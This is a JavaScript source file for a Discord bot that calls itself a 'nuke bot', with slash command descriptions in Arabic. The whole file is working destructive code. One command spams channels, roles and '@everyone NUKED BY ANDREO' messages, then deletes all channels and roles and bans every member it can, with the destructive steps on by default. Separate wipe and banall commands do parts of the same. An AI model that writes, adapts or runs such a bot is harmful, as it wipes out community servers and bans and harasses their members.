const { 
  Client, 
  GatewayIntentBits, 
  PermissionsBitField, 
  SlashCommandBuilder, 
  REST, 
  Routes 
} = require('discord.js');
const express = require('express');

const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const PORT = process.env.PORT || 8080;

// ---------- keep-alive ----------
const app = express();
app.get('/', (_req, res) => res.send('nuke bot alive'));
app.listen(PORT, () => console.log(`keep-alive on :${PORT}`));

// ---------- client ----------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
  ]
});

// ---------- utils ----------
const delay = (ms) => new Promise(r => setTimeout(r, ms));

// ---------- actions ----------
async function spamChannels(guild, name, count, speed) {
  for (let i = 0; i < count; i++) {
    await guild.channels.create({ name }).catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function spamRoles(guild, name, count, speed) {
  for (let i = 0; i < count; i++) {
    await guild.roles.create({ name: `${name}-${i}` }).catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function wipeChannels(guild, speed) {
  for (const [, ch] of guild.channels.cache) {
    await ch.delete().catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function wipeRoles(guild, speed) {
  for (const [, role] of guild.roles.cache) {
    if (role.id === guild.id || role.managed) continue;
    await role.delete().catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function banAll(guild, speed) {
  const members = await guild.members.fetch();
  for (const [, m] of members) {
    if (m.id === client.user.id) continue;
    if (!m.bannable) continue;
    await guild.members.ban(m.id, { reason: 'nuked' }).catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function renameAllChannels(guild, newName, speed) {
  for (const [, ch] of guild.channels.cache) {
    await ch.setName(newName).catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function spamMessages(guild, message, count, speed) {
  for (const [, ch] of guild.channels.cache) {
    if (!ch.isTextBased()) continue;
    for (let i = 0; i < count; i++) {
      await ch.send(message).catch(() => {});
      if (speed > 0) await delay(speed);
    }
  }
}

// ---------- slash commands ----------
const commands = [
  new SlashCommandBuilder()
    .setName('نيوك')
    .setDescription('النيوك الكامل — تحكم بكل شي')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
    .addStringOption(o =>
      o.setName('اسم_القنوات').setDescription('اسم القنوات اللي راح تنصنع').setRequired(false))
    .addStringOption(o =>
      o.setName('اسم_الرتب').setDescription('اسم الرتب اللي راح تنصنع').setRequired(false))
    .addStringOption(o =>
      o.setName('الرسالة').setDescription('الرسالة اللي راح تنرسل سبام').setRequired(false))
    .addIntegerOption(o =>
      o.setName('عدد_القنوات').setDescription('كم قناة تنصنع (افتراضي 30)').setMinValue(1).setMaxValue(100).setRequired(false))
    .addIntegerOption(o =>
      o.setName('عدد_الرتب').setDescription('كم رتبة تنصنع (افتراضي 30)').setMinValue(1).setMaxValue(100).setRequired(false))
    .addIntegerOption(o =>
      o.setName('عدد_الرسائل').setDescription('كم رسالة سبام بكل قناة (افتراضي 10)').setMinValue(1).setMaxValue(50).setRequired(false))
    .addIntegerOption(o =>
      o.setName('السرعة').setDescription('تأخير بالمللي ثانية بين كل عملية (افتراضي 0)').setMinValue(0).setMaxValue(5000).setRequired(false))
    .addBooleanOption(o =>
      o.setName('باند_الكل').setDescription('يبند كل الأعضاء؟ (افتراضي نعم)').setRequired(false))
    .addBooleanOption(o =>
      o.setName('مسح_القنوات').setDescription('يمسح القنوات الموجودة؟ (افتراضي نعم)').setRequired(false))
    .addBooleanOption(o =>
      o.setName('مسح_الرتب').setDescription('يمسح الرتب الموجودة؟ (افتراضي نعم)').setRequired(false))
    .addBooleanOption(o =>
      o.setName('تغيير_الاسماء').setDescription('يغير أسماء القنوات الحالية قبل المسح؟ (افتراضي لا)').setRequired(false))
    .addBooleanOption(o =>
      o.setName('سبام_الرسائل').setDescription('يرسل رسائل سبام قبل المسح؟ (افتراضي نعم)').setRequired(false)),

  new SlashCommandBuilder().setName('wipe').setDescription('يمسح القنوات والرتب فقط')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
  new SlashCommandBuilder().setName('banall').setDescription('يبند الكل')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
  new SlashCommandBuilder().setName('stop').setDescription('يوقف البوت')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
].map(c => c.toJSON());

// ---------- events ----------
client.once('ready', async () => {
  console.log(`logged in as ${client.user.tag} | ${client.guilds.cache.size} guilds`);
  const rest = new REST({ version: '10' }).setToken(TOKEN);
  try {
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log('slash commands registered.');
  } catch (err) {
    console.error('register failed:', err);
  }
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, guild } = interaction;
  if (!guild) return;

  if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return interaction.reply({ content: 'تحتاج صلاحية أدمن.', ephemeral: true });
  }

  // ============ /نيوك ============
  if (commandName === 'نيوك') {
    await interaction.deferReply({ ephemeral: true });

    const chName    = interaction.options.getString('اسم_القنوات')  || 'nuked-by-andreo';
    const roleName  = interaction.options.getString('اسم_الرتب')    || 'nuked';
    const msgText   = interaction.options.getString('الرسالة')       || '@everyone NUKED BY ANDREO';
    const chCount   = interaction.options.getInteger('عدد_القنوات')  ?? 30;
    const roleCount = interaction.options.getInteger('عدد_الرتب')    ?? 30;
    const msgCount  = interaction.options.getInteger('عدد_الرسائل')  ?? 10;
    const speed     = interaction.options.getInteger('السرعة')       ?? 0;
    const doBan     = interaction.options.getBoolean('باند_الكل')      ?? true;
    const doWipeCh  = interaction.options.getBoolean('مسح_القنوات')    ?? true;
    const doWipeRl  = interaction.options.getBoolean('مسح_الرتب')      ?? true;
    const doRename  = interaction.options.getBoolean('تغيير_الاسماء')  ?? false;
    const doSpamMsg = interaction.options.getBoolean('سبام_الرسائل')   ?? true;

    await interaction.editReply({ content: 'بدأ التنفيذ...' });

    try {
      if (doSpamMsg) await spamMessages(guild, msgText, msgCount, speed);
      if (doRename)  await renameAllChannels(guild, chName, speed);
      await spamChannels(guild, chName, chCount, speed);
      await spamRoles(guild, roleName, roleCount, speed);
      if (doWipeCh) await wipeChannels(guild, speed);
      if (doWipeRl) await wipeRoles(guild, speed);
      if (doBan)    await banAll(guild, speed);

      // ما نقدر نرسل رد بعد النيوك لأن القناة انمسحت — بس نحاول
      await interaction.editReply({ content: 'تم النيوك ✅' }).catch(() => {});
    } catch (err) {
      await interaction.editReply({ content: `خطأ: ${err.message}` }).catch(() => {});
    }
    return;
  }

  // ============ أوامر بسيطة ============
  if (commandName === 'wipe') {
    await interaction.reply({ content: 'بدأ المسح...', ephemeral: true });
    await wipeChannels(guild, 0);
    await wipeRoles(guild, 0);
    return;
  }

  if (commandName === 'banall') {
    await interaction.reply({ content: 'بدأ الباند...', ephemeral: true });
    await banAll(guild, 0);
    return;
  }

  if (commandName === 'stop') {
    await interaction.reply({ content: 'إيقاف...', ephemeral: true });
    process.exit(0);
  }
});

client.login(TOKEN);